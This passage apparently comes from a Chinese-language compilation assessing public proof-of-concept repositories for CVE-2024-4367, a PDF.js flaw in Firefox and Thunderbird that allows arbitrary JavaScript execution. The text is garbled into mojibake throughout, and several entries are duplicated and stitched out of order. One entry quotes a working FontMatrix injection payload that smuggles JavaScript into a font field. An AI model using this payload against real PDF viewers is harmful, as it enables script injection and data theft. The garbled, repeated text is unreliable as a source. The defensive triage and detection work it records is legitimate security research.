3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„å­—ä½“æ•°æ®ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ‰§è¡Œçš„ JavaScript ä»£ç å¯ä»¥è®¿é—® PDF.js çš„å†…éƒ¨å¯¹è±¡å’Œå‡½æ•°ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œï¼Œå¦‚è·¨ç«™è„šæœ¬æ”»å‡»(å¦‚æœPDF.jsè¢«åµŒå…¥åœ¨ç½‘é¡µä¸­)ã€‚

æ€»çš„æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æ„é€ åŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œè§¦å‘ JavaScript ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [spaceraccoon/detect-cve-2024-4367](https://github.com/spaceraccoon/detect-cve-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---



---

## POC #20

**æ¥æº**: [CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md](../2024/CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefox, Firefox ESR, Thunderbirdä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå­˜åœ¨äºPDF.jsä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„PDFæ–‡æ¡£ã€‚
2.  è¯¥PDFæ–‡æ¡£åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨PDF.jså­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€æ­¤PDFæ–‡æ¡£æ—¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ¶æ„å­—ä½“æ•°æ®ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼ŒPDF.jsä¼šæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“æ•°æ®ä¸­çš„æ¶æ„JavaScriptä»£ç ã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¯ä»¥è¿›è¡Œè¯¸å¦‚çªƒå–ä¿¡æ¯æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚

**POCåˆ†æï¼š**

æä¾›çš„POCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«:
*   å®šä¹‰äº†ä¸€ä¸ªShading Patternï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªFunctionï¼Œè¯¥Functionç”¨äºç”Ÿæˆé¢œè‰²ï¼ŒåŒ…å«/C0[0 0 1]å’Œ/C1[1 0.6 0]ï¼Œå®šä¹‰äº†ä»è“åˆ°æ©™è‰²çš„é¢œè‰²æ¸å˜
*   å®šä¹‰äº†ä¸€ä¸ªFontï¼Œå…¶ä¸­FontMatrixçš„å€¼ä¸º`[0.1 0 0 0.1 0 (1\); alert\('vprr')]`ï¼Œå…¶ä¸­åŒ…å«äº†åµŒå…¥çš„JavaScriptä»£ç `alert('vprr')`
*   å®šä¹‰äº†ä¸€ä¸ªPageï¼ŒContents ä½¿ç”¨äº†å®šä¹‰çš„ Shading Pattern å’Œ Fontï¼Œé€šè¿‡åœ¨PDFæ–‡æ¡£ä¸­ç»˜åˆ¶æ–‡æœ¬ï¼Œä¼šè§¦å‘å­—ä½“æ¸²æŸ“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“ä¸­çš„JavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œè¯¥POCåˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ï¼Œé€šè¿‡åœ¨FontMatrixä¸­åµŒå…¥JavaScriptä»£ç ï¼ŒæˆåŠŸå®ç°äº†ä»»æ„JavaScriptä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œè¯¥POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡ŒJavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚è™½ç„¶POCæœ¬èº«ä¸åŒ…å«æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½†å¦‚æœæ”»å‡»è€…åœ¨å®é™…æ”»å‡»ä¸­ï¼Œå¯èƒ½ä¼šå°†è­¦å‘Šæ¡†æ›¿æ¢ä¸ºæ›´éšè”½çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚å› æ­¤åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚ ä¸»è¦æ˜¯è€ƒè™‘äº†ä½œè€…å¯èƒ½å°†alertä¿¡æ¯æ›¿æ¢ä¸ºå…¶ä»–payloadã€‚ä½†å°±ç›®å‰æ¥çœ‹ï¼Œè¯¥PDF ä»…ä»…æ˜¯æ¼æ´éªŒè¯ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [pedrochalegre7/CVE-2024-4367-pdf-sample](https://github.com/pedrochalegre7/CVE-2024-4367-pdf-sample)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #21

**æ¥æº**: [CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-s4vvysec_CVE-2024-4367-POC.md)

## CVE-2024-4367 PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼Œæˆ–åœ¨ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ã€‚è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ï¼Œåœ¨ FontMatrix ä¸­æ’å…¥æ¶æ„ JavaScript ä»£ç ã€‚
2.  å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR, æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  åˆ©ç”¨ä»£ç  `poc.py` å¯ä»¥è‡ªåŠ¨åŒ–ç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç ç›´æ¥ç”ŸæˆåŒ…å«åµŒå…¥çš„ JavaScript ä»£ç çš„ PDFï¼Œå¹¶åˆ©ç”¨æ¼æ´æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**

åˆ†ææä¾›çš„ `poc.py` å’Œ `malicious.pdf` æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`poc.py` çš„ä½œç”¨æ˜¯ç”ŸæˆåŒ…å«æŒ‡å®š JavaScript payload çš„ PDF æ–‡ä»¶ï¼Œè€Œ `malicious.pdf` æ˜¯ä¸€ä¸ªå·²ç»ç”Ÿæˆå¥½çš„ç¤ºä¾‹ PDFã€‚ ä»“åº“çš„README.mdä¹Ÿæè¿°äº†å¦‚æœä½¿ç”¨pythonè„šæœ¬ç”ŸæˆPDFã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [s4vvysec/CVE-2024-4367-POC](https://github.com/s4vvysec/CVE-2024-4367-POC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #22

**æ¥æº**: [CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-snyk-labs_pdfjs-vuln-demo.md)

## CVE-2024-4367 - Mozilla Firefox, Firefox ESR, Thunderbird PDF.js JavaScript Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScript ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Mozilla Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„ PDF æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´æ˜¯ Mozilla Firefox, Firefox ESR, Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨æˆ– Thunderbird æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ¥çœ‹ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæœ¬åœ°çš„å¼€å‘ç¯å¢ƒæ¥éªŒè¯å’Œæµ‹è¯•åˆ©ç”¨æ­¤æ¼æ´çš„ PDF æ–‡ä»¶ã€‚ è¯¥ POC ä»£ç åŒ…å«ä¸€ä¸ªç”¨äºæ¼”ç¤ºæ¼æ´åˆ©ç”¨çš„ Web æœåŠ¡å™¨ï¼Œå¹¶æä¾›ä¸åŒå‰ç«¯æ¡†æ¶ï¼ˆReact, Vue, Svelteï¼‰çš„ç»„ä»¶ã€‚é€šè¿‡ä¿®æ”¹ç»„ä»¶æŒ‡å‘çš„ PDF æ–‡ä»¶ï¼Œå¯ä»¥æµ‹è¯•ä¸åŒçš„æ”»å‡»è½½è·ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼ˆç‰¹åˆ«æ˜¯ GitHub ä¸Šçš„ POC ä»“åº“ï¼‰ï¼Œè¯¥æ¼æ´è¢«ç¡®è®¤å­˜åœ¨ä¸”æœ‰å¯ç”¨çš„ POC ä»£ç ã€‚ POC ä»£ç æä¾›äº†ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå¯ä»¥ç”¨æ¥éªŒè¯æ¼æ´åˆ©ç”¨ã€‚ å› æ­¤ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**

åˆ†ææä¾›çš„ä»£ç ä»“åº“ï¼Œå‘ç°è¯¥ä»“åº“ä¸»è¦æ˜¯ä¸ºäº†æ¼”ç¤ºå’ŒéªŒè¯ CVE-2024-4367 æ¼æ´ï¼Œæœ¬èº«æä¾›äº† react, vue, svelte ä¸‰ç§æ¡†æ¶æ¥æ¼”ç¤ºæ¼æ´ï¼Œä»£ç æœ¬èº«ç›¸å¯¹æ¸…æ™°ã€‚ å­˜åœ¨çš„é£é™©æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç æ‰§è¡Œï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æµ‹è¯• PDF æ–‡ä»¶æˆ–è€…å‰ç«¯ä»£ç ï¼ˆè™½ç„¶ä¸å¤ªå®¹æ˜“ï¼‰æ¥å¼•å…¥æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°æŠ•æ¯’æ”»å‡»ã€‚ å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†ä¸»è¦é›†ä¸­åœ¨ä½¿ç”¨è¯¥ POC ä»£ç æ—¶ï¼Œç”¨æˆ·éœ€è¦æ£€æŸ¥å’ŒéªŒè¯æ‰€ä½¿ç”¨çš„ PDF æ–‡ä»¶å’Œå‰ç«¯ä»£ç çš„å®‰å…¨æ€§ã€‚ ä»£ç æ¡†æ¶è¾ƒä¸ºè§„èŒƒï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½œè€…å¯èƒ½åªæ˜¯æƒ³æ¼”ç¤ºæ¼æ´ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ¶æ„æ´»åŠ¨ã€‚ è€ƒè™‘åˆ°è¿™äº›å› ç´ ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æ:**

1.  **æ¼æ´æ ¹æºï¼š** PDF.js åœ¨å¤„ç† PDF æ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ–¹å¼ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
3.  **æ”»å‡»è¿‡ç¨‹ï¼š**
    *   ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ¶æ„ PDF æ–‡ä»¶ã€‚
    *   PDF.js è§£æè¯¥ PDF æ–‡ä»¶ã€‚
    *   ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­è¢«æ‰§è¡Œã€‚
4.  **æ”»å‡»ç»“æœï¼š** æ¶æ„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡Œä»»æ„ä»£ç ç­‰ã€‚ ç”±äº PDF.js è¿è¡Œåœ¨æµè§ˆå™¨çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸æ— æ³•ç›´æ¥è®¿é—®æ“ä½œç³»ç»Ÿçš„åº•å±‚èµ„æºã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬å¯èƒ½é€šè¿‡å…¶ä»–æ¼æ´æˆ–åˆ©ç”¨æµè§ˆå™¨çš„åŠŸèƒ½æ¥æå‡æƒé™ã€‚

**é¡¹ç›®åœ°å€:** [snyk-labs/pdfjs-vuln-demo](https://github.com/snyk-labs/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #23

**æ¥æº**: [CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md](../2024/CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è·¨ç«™è„šæœ¬æ”»å‡»

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å­—ä½“å¤„ç†æ—¶çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å­˜åœ¨ï¼Œå¹¶ä¸”æœ‰POCå¯ç”¨ï¼ˆ[webpage 6] æåˆ°äº† `exfil0/WEAPONIZING-CVE-2024-4367`ï¼Œæä¾›äº†åˆ©ç”¨ä»£ç ï¼‰ã€‚æä¾›çš„YARAè§„åˆ™å¯ä»¥ç”¨äºæ£€æµ‹åˆ©ç”¨æ­¤æ¼æ´çš„PDFæ–‡ä»¶ï¼Œè¡¨æ˜POCçš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ä»£ç åŒ…å«ä¸€ä¸ªYARAè§„åˆ™ï¼Œç”¨äºæ£€æµ‹åˆ©ç”¨CVE-2024-4367çš„PDFæ–‡ä»¶ã€‚LICENSEå’ŒREADMEæ–‡ä»¶æ˜¯æ ‡å‡†çš„å¼€æºé¡¹ç›®æ–‡ä»¶ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©æä½ï¼Œä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨äº† PDF.js ä¸­å­—ä½“å¤„ç†æ—¶ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥ã€‚
2.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„å­—ä½“æ•°æ®ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ‰§è¡Œçš„ JavaScript ä»£ç å¯ä»¥è®¿é—® PDF.js çš„å†…éƒ¨å¯¹è±¡å’Œå‡½æ•°ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œï¼Œå¦‚è·¨ç«™è„šæœ¬æ”»å‡»(å¦‚æœPDF.jsè¢«åµŒå…¥åœ¨ç½‘é¡µä¸­)ã€‚

æ€»çš„æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æ„é€ åŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œè§¦å‘ JavaScript ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [spaceraccoon/detect-cve-2024-4367](https://github.com/spaceraccoon/detect-cve-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---



---

## POC #20

**æ¥æº**: [CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md](../2024/CVE-2024-4367-pedrochalegre7_CVE-2024-4367-pdf-sample.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefox, Firefox ESR, Thunderbirdä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå­˜åœ¨äºPDF.jsä¸­ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„çš„PDFæ–‡æ¡£ã€‚
2.  è¯¥PDFæ–‡æ¡£åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨PDF.jså­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€æ­¤PDFæ–‡æ¡£æ—¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ¶æ„å­—ä½“æ•°æ®ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼ŒPDF.jsä¼šæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“æ•°æ®ä¸­çš„æ¶æ„JavaScriptä»£ç ã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¯ä»¥è¿›è¡Œè¯¸å¦‚çªƒå–ä¿¡æ¯æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚

**POCåˆ†æï¼š**

æä¾›çš„POCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«:
*   å®šä¹‰äº†ä¸€ä¸ªShading Patternï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªFunctionï¼Œè¯¥Functionç”¨äºç”Ÿæˆé¢œè‰²ï¼ŒåŒ…å«/C0[0 0 1]å’Œ/C1[1 0.6 0]ï¼Œå®šä¹‰äº†ä»è“åˆ°æ©™è‰²çš„é¢œè‰²æ¸å˜
*   å®šä¹‰äº†ä¸€ä¸ªFontï¼Œå…¶ä¸­FontMatrixçš„å€¼ä¸º`[0.1 0 0 0.1 0 (1\); alert\('vprr')]`ï¼Œå…¶ä¸­åŒ…å«äº†åµŒå…¥çš„JavaScriptä»£ç `alert('vprr')`
*   å®šä¹‰äº†ä¸€ä¸ªPageï¼ŒContents ä½¿ç”¨äº†å®šä¹‰çš„ Shading Pattern å’Œ Fontï¼Œé€šè¿‡åœ¨PDFæ–‡æ¡£ä¸­ç»˜åˆ¶æ–‡æœ¬ï¼Œä¼šè§¦å‘å­—ä½“æ¸²æŸ“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥åœ¨å­—ä½“ä¸­çš„JavaScriptä»£ç ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’ŒPOCä»£ç ï¼Œè¯¥POCåˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±æ¼æ´ï¼Œé€šè¿‡åœ¨FontMatrixä¸­åµŒå…¥JavaScriptä»£ç ï¼ŒæˆåŠŸå®ç°äº†ä»»æ„JavaScriptä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œè¯¥POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**

